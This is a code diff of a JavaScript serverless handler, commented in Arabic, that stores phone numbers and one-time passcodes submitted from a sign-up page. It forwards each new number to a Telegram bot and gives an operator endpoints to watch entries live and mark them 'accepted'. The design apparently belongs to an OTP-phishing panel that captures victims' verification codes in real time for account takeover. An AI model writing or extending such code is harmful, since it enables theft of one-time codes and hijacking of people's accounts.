@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     const usersCol = collection(db, "users");
 
     try {
-        // 1. جلب البيانات (للإدارة)
+        // 1. جلب البيانات (للإدارة وللمراقبة في صفحة otp.html)
         if (method === 'GET') {
             const q = query(usersCol, orderBy("timestamp", "desc"));
             const snapshot = await getDocs(q);
@@ -21,24 +21,30 @@ export default async function handler(req, res) {
         // 2. إرسال بيانات جديدة (من صفحة التسجيل)
         if (method === 'POST') {
             const { phone, otp } = req.body;
-            // حفظ البيانات والحصول على المرجع
-            const docRef = await addDoc(usersCol, { phone, otp, status: "pending", timestamp: new Date() });
+            const docRef = await addDoc(usersCol, { 
+                phone, 
+                otp: otp || "", 
+                status: "pending", 
+                timestamp: new Date() 
+            });
             
-            // إشعار تليجرام
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: `رقم جديد: ${phone}` })
             });
             
-            // نرسل الـ id للمتصفح ليخزنه في localStorage
             return res.status(200).json({ success: true, id: docRef.id });
         }
 
-        // 3. تعديل الحالة (قبول)
+        // 3. تعديل الحالة (قبول) - هنا يتم الانتقال التلقائي بناءً على هذا التحديث
         if (method === 'PATCH') {
-            const { id, status } = req.body;
-            await updateDoc(doc(db, "users", id), { status: status });
+            const { id, otp, status } = req.body;
+            const updateData = {};
+            if (otp) updateData.otp = otp;
+            if (status) updateData.status = status;
+            
+            await updateDoc(doc(db, "users", id), updateData);
             return res.status(200).json({ success: true });
         }
 
